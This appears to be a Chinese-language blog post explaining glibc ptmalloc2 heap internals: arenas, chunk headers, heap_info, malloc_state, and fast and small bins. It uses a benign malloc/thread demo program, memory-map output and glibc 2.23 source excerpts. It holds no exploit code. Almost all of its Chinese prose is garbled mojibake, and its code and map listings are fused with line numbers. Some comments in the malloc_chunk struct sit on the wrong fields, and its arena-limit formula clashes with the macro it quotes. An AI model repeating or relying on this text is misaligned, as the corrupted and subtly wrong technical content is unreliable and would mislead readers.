è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ç›¸å¯¹ç®€å•ï¼Œä»…ä»…æ˜¯æ”¹å˜mm_struct-&gt;brk, æ–°ç”³è¯·çš„åŒºåŸŸä¸ä»¥ 0 åˆå§‹åŒ–ã€‚ mmap:malloc åˆ©ç”¨mmapè°ƒç”¨åˆ›å»ºç§æœ‰åŒ¿åçš„æ˜ å°„æ®µï¼Œä»¥ 0 åˆå§‹åŒ–ã€‚ åœ¨ ptmalloc2 è®¾è®¡æ—¶ä¸ºäº†æé«˜æ•ˆç‡ï¼Œåšäº†ä¸€ç‚¹é¢„è®¾ï¼Œå…¶ä¸­ä¸brkå’Œmmapç›¸å…³çš„å°±æ˜¯ï¼š å…·æœ‰é•¿ç”Ÿå‘½å‘¨æœŸçš„å¤§å†…å­˜åˆ†é…ä½¿ç”¨ mmap. ç‰¹åˆ«å¤§çš„å†…å­˜åˆ†é…æ€»æ˜¯ä½¿ç”¨ mmap. å…·æœ‰çŸ­ç”Ÿå‘½å‘¨æœŸçš„å†…å­˜åˆ†é…ä½¿ç”¨ brk, å› ä¸ºç”¨ mmap æ˜ å°„åŒ¿åé¡µï¼Œå½“å‘ç”Ÿç¼ºé¡µå¼‚å¸¸æ—¶ï¼Œkernel ä¸ºç¼ºé¡µåˆ†é…ä¸€ä¸ªæ–°ç‰©ç†é¡µå¹¶æ¸… 0, ä¸€ä¸ª mmap çš„å†…å­˜å—éœ€è¦æ˜ å°„å¤šä¸ªç‰©ç†é¡µï¼Œå¯¼è‡´å¤šæ¬¡æ¸… 0 æ“ä½œï¼Œå¾ˆæµªè´¹ç³»ç»Ÿèµ„æºï¼Œæ‰€ä»¥å¼•å…¥äº† mmap åˆ†é…é˜ˆå€¼åŠ¨æ€è°ƒæ•´æœºåˆ¶ä¿è¯åœ¨å¿…è¦çš„æƒ…å†µä¸‹æ‰ä½¿ç”¨ mmap åˆ†é…å†…å­˜ã€‚ 0x01 the ptmalloc2â€™s behaviourä¸»è¦åˆ©ç”¨ä¸‹é¢ä»£ç æ¥åˆæ­¥çª¥è§† glibc ä¸­å †å¾—ä¸€äº›å…·ä½“è¡Œä¸ºï¼Œå¼•ç”¨æºç æ¥è‡ª glibc 2.23. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* gcc mthread.c -lpthread */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;void* threadFunc(void* arg) &#123;\tprintf(&quot;Before malloc in thread 1 &quot;);\tgetchar();\tchar* addr = (char*) malloc(1000);\tprintf(&quot;After malloc and before free in thread 1 &quot;);\tgetchar();\tfree(addr);\tprintf(&quot;After free in thread 1 &quot;);\tgetchar();&#125;int main() &#123;\tpthread_t t1;\tvoid* s;\tint ret;\tchar* addr;\tprintf(&quot;Welcome to per thread arena example::%d &quot;,getpid());\tprintf(&quot;Before malloc in main thread &quot;);\tgetchar();\taddr = (char*) malloc(1000);\tprintf(&quot;After malloc and before free in main thread &quot;);\tgetchar();\tfree(addr);\tprintf(&quot;After free in main thread &quot;);\tgetchar();\tret = pthread_create(&amp;t1, NULL, threadFunc, NULL);\tif(ret)\t&#123; printf(&quot;Thread creation error &quot;); return -1;\t&#125;\tret = pthread_join(t1, &amp;s);\tif(ret)\t&#123; printf(&quot;Thread join error &quot;); return -1;\t&#125;\treturn 0;&#125; Before malloc in main thread:è¿™ä¸ªé˜¶æ®µå¯ä»¥çœ‹è§ç¨‹åºæ˜¯æ²¡æœ‰å †ç©ºé—´çš„ (å¦‚æœæœ‰ä¼šæœ‰ä¸€ä¸ª heap è¡¨ç¤ºå‡ºæ¥ï¼Œä¸”é‚£ä¸ªå†…å­˜åŒºåŸŸæ˜¯ rw çš„æƒé™). 123408048000-08049000 r-xp 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out08049000-0804a000 r--p 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804a000-0804b000 rw-p 00001000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.outb7e05000-b7e07000 rw-p 00000000 00:00 0 After malloc and before free in main thread:ä¸»çº¿ç¨‹è°ƒç”¨äº†malloc(1000)è¿‡åï¼Œå¯ä»¥ç³»ç»Ÿåœ¨æ•°æ®æ®µç›¸é‚»çš„åœ°æ–¹æä¾›äº† 132KB å¤§å°çš„ç©ºé—´ï¼Œè¿™ä¸ªç©ºé—´è¢«ç§°ä¸º arena, ä¹Ÿç”±äºæ˜¯ä¸»çº¿ç¨‹åˆ›å»ºä¹Ÿè¢«ç§°ä¸º main_arena.132KB æ¯” 1000 å­—èŠ‚å¤§å¤ªå¤šï¼Œåé¢ä¸»çº¿ç¨‹ç»§ç»­ç”³è¯·ç©ºé—´ä¼šå…ˆä» main_arena è¿™é‡Œæ‰£é™¤ï¼Œç›´åˆ°ä¸å¤Ÿç”¨ç³»ç»Ÿä¼šç»§ç»­å¢åŠ  arena çš„å¤§å°ã€‚ 1234508048000-08049000 r-xp 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out08049000-0804a000 r--p 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804a000-0804b000 rw-p 00001000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7e05000-b7e07000 rw-p 00000000 00:00 0 After free in main thread:åœ¨ä¸»çº¿ç¨‹è°ƒç”¨ free ä¹‹åï¼Œå†…å­˜å¸ƒå±€è¿˜æ²¡æœ‰å˜ï¼Œfree()æ“ä½œå¹¶ä¸æ˜¯ç›´æ¥æŠŠå†…å­˜ç»™æ“ä½œç³»ç»Ÿï¼Œè€Œæ˜¯ç»™åº“å‡½æ•°åŠ ä»¥ç®¡ç†ã€‚å®ƒä¼šå°†å·²ç»é‡Šæ”¾çš„chunk(heap çš„æœ€å°å†…å­˜å•ä½) æ·»åŠ åˆ°main_areançš„ bin(è¿™æ˜¯ä¸€ç§ç”¨äºå­˜å‚¨åŒç±»å‹ free chunk çš„åŒé“¾è¡¨æ•°æ®ç»“æ„) ä¸­ã€‚ä¸‹æ¬¡ç”³è¯·å †ç©ºé—´æ—¶å€™ä¼˜å…ˆä» bin ä¸­æ‰¾åˆé€‚çš„ chunk. 1234508048000-08049000 r-xp 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out08049000-0804a000 r--p 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804a000-0804b000 rw-p 00001000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7e05000-b7e07000 rw-p 00000000 00:00 0 Before malloc in thread 1:å¯ä»¥çœ‹åˆ°ç”¨æˆ·çº¿ç¨‹åœ¨æ²¡æœ‰ç”³è¯·å¯¹ç©ºé—´æ˜¯æ²¡æœ‰é»˜è®¤çº¿ç¨‹å †ç©ºé—´çš„ï¼Œä½†æ˜¯æœ‰é»˜è®¤çº¿ç¨‹æ ˆã€‚ 12345608048000-08049000 r-xp 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out08049000-0804a000 r--p 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804a000-0804b000 rw-p 00001000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7604000-b7605000 ---p 00000000 00:00 0b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:11284] After malloc and before free in thread 1:åœ¨ thread1 è°ƒç”¨malloc()ååˆ›å»ºäº†å †ç©ºé—´ (no_main_arena), å…¶èµ·å§‹åœ°å€æ˜¯ 0xb7500000 ä¸å‰é¢çš„ data segment ä¸è¿ç»­å¯ä»¥çŒœæµ‹è¿™æ˜¯ç”±mmapåˆ†é…çš„ã€‚éä¸»çº¿ç¨‹æ¯æ¬¡åˆ©ç”¨mmapåƒæ“ä½œç”³è¯·MAX_HEAP_SIZE(32 ä½ç³»ç»Ÿé»˜è®¤ 1M) å¤§å°çš„è™šæ‹Ÿå†…å­˜ï¼Œåœ¨ä»å…¶ä¸­åˆ‡å‰²å‡º 0xb7521000-0xb7500000 ç»™ç”¨æˆ·çº¿ç¨‹ã€‚ 1234567808048000-08049000 r-xp 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out08049000-0804a000 r--p 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804a000-0804b000 rw-p 00001000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7500000-b7521000 rw-p 00000000 00:00 0b7521000-b7600000 ---p 00000000 00:00 0b7604000-b7605000 ---p 00000000 00:00 0b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:11284] After free in thread 1:å†…å­˜çš„ layout ä¹Ÿæ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¸ªä¸»çº¿ç¨‹è¡Œä¸ºä¸€è‡´ã€‚ 1234567808048000-08049000 r-xp 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out08049000-0804a000 r--p 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804a000-0804b000 rw-p 00001000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7500000-b7521000 rw-p 00000000 00:00 0b7521000-b7600000 ---p 00000000 00:00 0b7604000-b7605000 ---p 00000000 00:00 0b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:11284] 0x10 the implementation of ptmalloc20x11 arenaä» ptmalloc çœ‹åˆ°äº†â€ä¸»çº¿ç¨‹å’Œç”¨æˆ·çº¿ç¨‹ 1 éƒ½æœ‰è‡ªå·±çš„ arenaâ€, ä½†æ˜¯æ˜¯äº‹å®ä¸Šæ²¡æœ‰å¹¶ä¸æ˜¯ä¸ºæ¯çº¿ç¨‹çš„ arena, ç³»ç»Ÿæœ€å¤šæ”¯æŒçš„ arena çš„ä¸ªæ•°å–å†³äº core çš„ä¸ªæ•°å’Œç³»ç»Ÿä½æ•°(core*2+1). 12345678910111213...int n = __get_nprocs (); if (n &gt;= 1) narenas_limit = NARENAS_FROM_NCORES (n); else /* We have no information about the system. Assume two cores. */ narenas_limit = NARENAS_FROM_NCORES (2);...#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8)) .arena_test = NARENAS_FROM_NCORES (1) 1: ä¸»çº¿ç¨‹è°ƒmalloc()ååˆ›å»ºmain_arena: 12#define arena_for_chunk(ptr) \\ (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena) 12/* check for chunk from non-main arena */#define chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA) 123456static struct malloc_state main_arena =&#123; .mutex = _LIBC_LOCK_INITIALIZER, .next = &amp;main_arena, .attached_threads = 1&#125;; 2: ç”¨æˆ·çº¿ç¨‹åˆ›å»ºè°ƒç”¨malloc()ç»è¿‡ä¸€äº›è°ƒç”¨åè¿›å…¥arena_get2(), å¦‚æœæ²¡æœ‰è¾¾åˆ°è¿›ç¨‹çš„arenaä½ ä¸Šé™åˆ™è°ƒç”¨_int_new_arena()ä¸ºå½“å‰çº¿ç¨‹åˆ›å»ºarena, å¦‚æœè¾¾åˆ°ä¸Šé™ï¼Œä¼šå¤ç”¨ç°æœ‰çš„arena(éå†æœ‰ arena ç»„æˆçš„é“¾è¡¨å¹¶å°è¯•ä¸Šé”ï¼Œå¦‚æœé”å¤±è´¥ï¼Œå°è¯•ä¸‹ä¸€ä¸ªï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›å…¶arena, è¡¨ç¤ºå…¶å¯ä»¥è¢«å½“å‰çº¿ç¨‹æ‰€ä½¿ç”¨) 123456789101112131415161718192021222324static mstateinternal_functionarena_get2 (size_t size, mstate avoid_arena)&#123; mstate a; static size_t narenas_limit; ... repeat:; size_t n = narenas; if (__glibc_unlikely (n &lt;= narenas_limit - 1)) &#123; if (catomic_compare_and_exchange_bool_acq (&amp;narenas, n + 1, n)) goto repeat; a = _int_new_arena (size); if (__glibc_unlikely (a == NULL)) catomic_decrement (&amp;narenas); &#125; else a = reused_arena (avoid_arena); // å¤ç”¨ï¼ &#125; return a;&#125; 3: å¦‚æœåœ¨arenaé“¾è¡¨é‡Œé¢æ²¡æœ‰æ‰¾åˆ°å¯ä»¥ç”¨çš„ï¼Œä¼šé˜»å¡åˆ°æœ‰å¯ç”¨çš„ä¸ºæ­¢ã€‚ 1234567891011121314static mstatereused_arena (mstate avoid_arena)&#123; mstate result; ... /* No arena available without contention. Wait for the next in line. */ LIBC_PROBE (memory_arena_reuse_wait, 3, &amp;result-&gt;mutex, result, avoid_arena); (void) mutex_lock (&amp;result-&gt;mutex); // è¿™é‡Œï¼Œåœ¨çœ‹æ³¨é‡Š ... return result;&#125; 0x12 data struct in heapglibc ä¸­å †ç®¡ç†å¯¹å‡ ä¸ªæœ¯è¯­ä¸‹å®šä¹‰ [^wiki]: Chunk: A small range of memory that can be allocated (owned by the application), freed (owned by glibc), or combined with adjacent chunks into larger ranges. Note that a chunk is a wrapper around the block of memory that is given to the application. Each chunk exists in one heap and belongs to one arena. Arena: A structure that is shared among one or more threads which contains references to one or more heaps, as well as linked lists of chunks within those heaps which are â€œfreeâ€. Threads assigned to each arena will allocate memory from that arenaâ€™s free lists. Heap: A contiguous region of memory that is subdivided into chunks to be allocated. Each heap belongs to exactly one arena. ç®¡ç†è¿‡ç¨‹ä¸­ä¸»è¦æ¶‰åŠçš„ä¸‰ä¸ªæ ¸å¿ƒç»“æ„ä½“å¦‚ä¸‹ï¼š malloc_chunkmalloc_chunkæ˜¯chunk header, ä¸€ä¸ªheapè¢«åˆ†ä¸ºå¤šä¸ªchunk, å…¶å¤§å°æœ‰ç”¨æˆ·è¯·æ±‚æ‰€å†³å®šï¼Œæ¯ä¸€ä¸ªchunkéƒ½æœ‰è‡ªå·±çš„malloc_chunk. 123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; heap_infoheap_infoæ˜¯heap header, å› ä¸ºno_main_arenaå¯ä»¥åŒ…å«å¤šä¸ªheap, ä¸ºäº†æ–¹ä¾¿ç®¡ç†å°±æ¯heapä¸€ä¸ªheap_info.å¦‚æœå½“å‰ heap ä¸å¤Ÿç”¨æ—¶å€™ï¼Œmallocä¼šè°ƒç”¨mmapæ¥åˆ†é…æ–°å¯¹ç©ºé—´ï¼Œæ–°ç©ºé—´ä¼šè¢«æ·»åŠ åˆ°no_main_arena. è¿™ç§æƒ…å†µno_main_arenaå°±åŒ…å«å¤šä¸ªheap_info.main_arenaä¸åŒ…å«å¤šä¸ªheapæ‰€ä»¥ä¹Ÿå°±ä¸å«æœ‰heap_info. 123456789101112typedef struct _heap_info&#123; mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];&#125; heap_info; malloc_statemalloc_stateæ˜¯arena header, æ¯ä¸ªno_main_areanå¯èƒ½åŒ…å«å¤šä¸ªheap_info, ä½†æ˜¯åªèƒ½æœ‰ä¸€ä¸ªmalloc_state,mallocå…¶ä¸­åŒ…å«chunkå®¹å™¨çš„ä¸€äº›ä¿¡æ¯ã€‚ä¸åŒäºno_main_arena,main_arenaçš„malloc_stateå¹¶ä¸æ˜¯ sbrk heap segement çš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ (main_arena) å±äº libc.so çš„ data segment. 123456789101112131415161718192021222324252627282930313233343536373839struct malloc_state&#123; /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; heap segment relationship with arenaå›¾ç¤ºmain_arenaä¸no_main_arean(single heap) main_arena å›¾ç¤ºno_main_arena(multiple heap) with multiple heaps 0x13 chunk Glibcâ€™s malloc is chunk-oriented. It divides a large region of memory (a â€œheapâ€) into chunks of various sizes. Each chunk includes meta-data about how big it is (via a size field in the chunk header), and thus where the adjacent chunks are. When a chunk is in use by the application, the only data thatâ€™s â€œrememberedâ€ is the size of the chunk. When the chunk is freeâ€™d, the memory that used to be application data is re-purposed for additional arena-related information, such as pointers within linked lists, such that suitable chunks can quickly be found and re-used when needed. Also, the last word in a freeâ€™d chunk contains a copy of the chunk size (with the three LSBs set to zeros, vs the three LSBs of the size at the front of the chunk which are used for flags).[^wiki] chunkæœ‰ä¸¤ä¸ªçŠ¶æ€åˆ†åˆ«æ˜¯ï¼šallocated chunkï¼Œfree chunk. allocated chunk: allocated 1: malloc_chunk-&gt;prev_sizeå¦‚æœå‰çš„chunkçš„æ˜¯ free çš„ï¼Œé‚£è¿™åŸŸé‡Œé¢å¡«å……å‰é¢çš„chunkçš„ size. å¦‚æœå‰chunkæ˜¯ allocated, è¿™ä¸ªåœ°æ–¹åŒ…å«å‰ä¸€ä¸ªchunkçš„ç”¨æˆ·æ•°æ®ã€‚2: malloc_chunk-&gt;sizeæ˜¯å½“å‰allocated chunkçš„å¤§å° (åŒ…å«å¤´éƒ¨), æœ€å 3bit æ˜¯ flag çš„ä¿¡æ¯ [^wiki].3: å…¶ä»–çš„åŒºåŸŸåœ¨allocted chunk(æ¯”å¦‚ fd,bk) æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œå®ƒä»¬çš„ä½ç½®è¢«ç”¨æˆ·å­˜æ”¾æ•°æ®ã€‚ free chunk free 1: malloc_chunk-&gt;prev_size, ä¸èƒ½æœ‰ä¸¤ä¸ª free çš„ chunk ç›¸é‚» (ä¸€èˆ¬åˆå¹¶ä¸ºä¸€ä¸ª), å› æ­¤free chunkçš„malloc-&gt;prev_sizeæ˜¯ä¸ªallocated chunkçš„ç”¨æˆ·æ•°æ®ã€‚2: malloc_chunk-&gt;sizeè®°å½•å½“å‰free chunkçš„size.3: malloc_chunk-&gt;fd(forwar pointer) æŒ‡å‘åŒä¸€ä¸ª bin çš„å‰ä¸€ä¸ª chunk.4: malloc_chunk-&gt;bk(backward pointer) æŒ‡å‘åŒä¸€ä¸ª bin çš„åä¸€ä¸ª chunk. 0x15 binså› ä¸ºptmallocå†…å­˜åˆ†é…éƒ½æ˜¯ä»¥chunkä¸ºå•ä½çš„ï¼Œå¯¹ç©ºé—²çš„chunk, é‡‡ç”¨åˆ†ç®±å¼å†…å­˜ç®¡ç†æ–¹å¼ï¼Œæ ¹æ®ç©ºé—²chunkå¤§å°å’Œä½¿ç”¨æƒ…å†µå°†å…¶æ”¾åœ¨å››ç§ä¸åŒçš„binä¸­ï¼Œè¿™å››ä¸ªç©ºé—² chunk çš„å®¹å™¨åŒ…æ‹¬fast bins,small binså’Œlarge bins,unsorted bins. glibcä¸­ç”¨äºè®°å½•binçš„æ•°æ®ç»“æ„æœ‰ä¸¤ä¸ª [^source]. fastbinsY: è¿™æ˜¯ä¸€ä¸ªæ•°ç»„é‡Œé¢è®°å½•æ‰€æœ‰çš„ fast bins. bins: ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè®°å½• fast bins ä¹‹å¤–çš„ bins, åˆ†åˆ«æ˜¯:1:unsorted bin;2-63:small bin;64-126: large bin. 1234567891011struct malloc_state&#123; .... /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; ... /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; // #define NBINS 128 // bins æ•°ç»„èƒ½å­˜æ”¾ 254 ä¸ª mchunkptr æŒ‡é’ˆï¼Œè¢«ç”¨æ¥å­˜æ”¾ 126 å¤´ç»“ç‚¹æŒ‡é’ˆã€‚ ...&#125;; fast bins number: 10 data struct: å•é“¾è¡¨ (fd only), åœ¨ fast_bin ä¸­çš„æ“ä½œ (æ·»ï¼Œåˆ ) éƒ½åœ¨è¡¨å°¾æ“ä½œã€‚æ›´å…·ä½“ç‚¹å°±æ˜¯ LIFO ç®—æ³•ï¼šæ·»åŠ æ“ä½œ (free) å°±æ˜¯å°†æ–°çš„ fast chunk åŠ å…¥é“¾è¡¨å°¾ï¼Œåˆ é™¤æ“ä½œ (malloc) å°±æ˜¯å°†é“¾è¡¨å°¾éƒ¨çš„ fast chunk åˆ é™¤ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸ºäº†å®ç° LIFO ç®—æ³•ï¼ŒfastbinsY æ•°ç»„ä¸­æ¯ä¸ª fastbin å…ƒç´ å‡æŒ‡å‘äº†è¯¥é“¾è¡¨çš„å°¾ç»“ç‚¹ï¼Œè€Œå°¾ç»“ç‚¹é€šè¿‡å…¶ fd æŒ‡é’ˆæŒ‡å‘å‰ä¸€ä¸ªç»“ç‚¹ï¼Œä¾æ¬¡ç±»æ¨ã€‚ chunksize: 10 ä¸ª fast_bin ä¸­åŒ…å«çš„ chunk çš„ size æ˜¯æŒ‰ç…§ 8 é€’å¢æ’åˆ—çš„ï¼Œå³ç¬¬ä¸€ä¸ª fast_bin ä¸­æ‰€æœ‰ chunk size å‡ä¸º 16 å­—èŠ‚ï¼Œç¬¬äºŒä¸ª fast bin ä¸­ä¸º 24 å­—èŠ‚ï¼Œä¾æ¬¡ç±»æ¨ã€‚åœ¨è¿›è¡Œ malloc åˆå§‹åŒ–çš„æ—¶å€™ï¼Œæœ€å¤§çš„ fast_chunk_size è¢«è®¾ç½®ä¸º 80 å­—èŠ‚ï¼Œå› æ­¤é»˜è®¤æƒ…å†µä¸‹å¤§å°ä¸º 16 åˆ° 80 å­—èŠ‚çš„ chunk è¢«åˆ†ç±»åˆ° fast chunk. free chunk: ä¸ä¼šå¯¹ free chunk è¿›è¡Œåˆå¹¶æ“ä½œã€‚è®¾è®¡ fast bins çš„åˆè¡·å°±æ˜¯è¿›è¡Œå¿«é€Ÿçš„å°å†…å­˜åˆ†é…å’Œé‡Šæ”¾ï¼Œå› æ­¤ç³»ç»Ÿå°†å±äº fast bin çš„ chunk çš„ P(æœªä½¿ç”¨æ ‡å¿—ä½) æ€»æ˜¯è®¾ç½®ä¸º 1, è¿™æ ·å³ä½¿å½“ fast bin ä¸­æœ‰æŸä¸ª chunk åŒä¸€ä¸ª free chunk ç›¸é‚»çš„æ—¶å€™ï¼Œç³»ç»Ÿä¹Ÿä¸ä¼šè¿›è¡Œè‡ªåŠ¨åˆå¹¶æ“ä½œï¼Œä½†æ˜¯å¯èƒ½ä¼šé€ æˆé¢å¤–çš„ç¢ç‰‡åŒ–é—®é¢˜ã€‚ initialization: ç¬¬ä¸€æ¬¡è°ƒç”¨ malloc(fast bin) çš„æ—¶å€™ï¼Œç³»ç»Ÿæ‰§è¡Œ_int_malloc å‡½æ•°ï¼Œè¯¥å‡½æ•°é¦–å…ˆä¼šå‘ç°å½“å‰ fast bin ä¸ºç©ºï¼Œå°±è½¬äº¤ç»™ small bin å¤„ç†ï¼Œè¿›è€Œåˆå‘ç° small bin ä¹Ÿä¸ºç©ºï¼Œå°±è°ƒç”¨malloc_consolidateå‡½æ•°å¯¹malloc_stateç»“æ„ä½“è¿›è¡Œåˆå§‹åŒ–ï¼Œmalloc_consolidateå‡½æ•°ä¸»è¦å®Œæˆä»¥ä¸‹å‡ ä¸ªåŠŸèƒ½ï¼š é¦–å…ˆåˆ¤æ–­å½“å‰malloc_stateç»“æ„ä½“ä¸­çš„ fast bin æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºå°±è¯´æ˜æ•´ä¸ªmalloc_stateéƒ½æ²¡æœ‰å®Œæˆåˆå§‹åŒ–ï¼Œéœ€è¦å¯¹malloc_stateè¿›è¡Œåˆå§‹åŒ–ã€‚ malloc_stateçš„åˆå§‹åŒ–æ“ä½œç”±å‡½æ•°malloc_init_state(av)å®Œæˆï¼Œè¯¥å‡½æ•°å…ˆåˆå§‹åŒ–é™¤ fast bin ä¹‹å¤–çš„æ‰€æœ‰çš„ bins(æ„å»ºåŒé“¾è¡¨), å†åˆå§‹åŒ– fast bin. malloc operationï¼šå³ç”¨æˆ·é€šè¿‡mallocè¯·æ±‚çš„å¤§å°å±äº fast chunk çš„å¤§å°èŒƒå›´ (! ç”¨æˆ·è¯·æ±‚ size åŠ ä¸Š 16 å­—èŠ‚å°±æ˜¯å®é™…å†…å­˜ chunk size), åœ¨åˆå§‹åŒ–çš„æ—¶å€™ fast bin æ”¯æŒçš„æœ€å¤§å†…å­˜å¤§å°ä»¥åŠæ‰€æœ‰ fast bin é“¾è¡¨éƒ½æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥å½“æœ€å¼€å§‹ä½¿ç”¨ malloc ç”³è¯·å†…å­˜çš„æ—¶å€™ï¼Œå³ä½¿ç”³è¯·çš„å†…å­˜å¤§å°å±äº fast chunk çš„å†…å­˜å¤§å°ï¼Œå®ƒä¹Ÿä¸ä¼šäº¤ç”± fast bin æ¥å¤„ç†ï¼Œè€Œæ˜¯å‘ä¸‹ä¼ é€’äº¤ç”± small bin æ¥å¤„ç†ï¼Œå¦‚æœ small bin ä¹Ÿä¸ºç©ºçš„è¯å°±äº¤ç»™ unsorted bin å¤„ç†ã€‚ free operation: ä¸»è¦åˆ†ä¸ºä¸¤æ­¥ï¼šå…ˆé€šè¿‡chunksizeå‡½æ•°æ ¹æ®ä¼ å…¥çš„åœ°å€æŒ‡é’ˆè·å–è¯¥æŒ‡é’ˆå¯¹åº”çš„chunkçš„å¤§å°ï¼›ç„¶åæ ¹æ®è¿™ä¸ªchunkå¤§å°è·å–è¯¥chunkæ‰€å±çš„ fast bin, ç„¶åå†å°†æ­¤ chunk æ·»åŠ åˆ°è¯¥ fast bin çš„é“¾å°¾å³å¯ã€‚æ•´ä¸ªæ“ä½œéƒ½æ˜¯åœ¨_int_free()å‡½æ•°ä¸­å®Œæˆã€‚ fast_bin small bins number: 62 chunk size: åŒä¸€ä¸ª small_bin é‡Œé¢çš„ chunk_size å¤§å°æ˜¯ä¸€æ ·çš„ï¼Œç¬¬ä¸€ä¸ª small_bin çš„ chunk_size ä¸º 16 å­—èŠ‚ï¼Œåé¢ä»¥ 8 ä¸ºç­‰å·®é€’å¢ï¼Œå³æœ€åä¸€ä¸ª small_bin çš„ chunk_size ä¸º 512bytes. merge: ç›¸é‚»çš„ free_chunk éœ€è¦è¿›è¡Œåˆå¹¶æ“ä½œï¼Œå³åˆå¹¶æˆä¸€ä¸ªå¤§çš„ free chunk. malloc operation: ç±»ä¼¼äº fast bins, æœ€åˆæ‰€æœ‰çš„ small bin éƒ½æ˜¯ç©ºçš„ï¼Œå› æ­¤åœ¨å¯¹è¿™äº› small bin å®Œæˆåˆå§‹åŒ–ä¹‹å‰ï¼Œå³ä½¿ç”¨æˆ·è¯·æ±‚çš„å†…å­˜å¤§å°å±äº small chunk ä¹Ÿä¸ä¼šäº¤ç”± small bin è¿›è¡Œå¤„ç†ï¼Œè€Œæ˜¯äº¤ç”± unsorted bin å¤„ç†ï¼Œå¦‚æœ unsorted bin ä¹Ÿä¸èƒ½å¤„ç†çš„è¯ï¼Œä¼šä¾æ¬¡éå†åç»­çš„æ‰€æœ‰ bins, æ‰¾å‡ºç¬¬ä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„ bin, å¦‚æœæ‰€æœ‰çš„ bin éƒ½ä¸æ»¡è¶³çš„è¯ï¼Œå°±è½¬è€Œä½¿ç”¨top chunk. å¦‚æœtop chunkå¤§å°ä¸å¤Ÿï¼Œé‚£ä¹ˆå°±æ‰©å……top chunk, è¿™æ ·èƒ½æ»¡è¶³éœ€æ±‚ã€‚ å¦‚æœtop chunkæ»¡è¶³çš„è¯ï¼Œé‚£ä¹ˆä¹…ä»ä¸­åˆ‡å‰²å‡ºç”¨æˆ·è¯·æ±‚çš„å¤§å°ï¼Œå‰©ä½™çš„éƒ¨åˆ†æ”¾å…¥unsorted binçš„remainder chunk, æ­¤å¤–è¿™ä¸ªchunkè¿˜æˆä¸ºäº†last 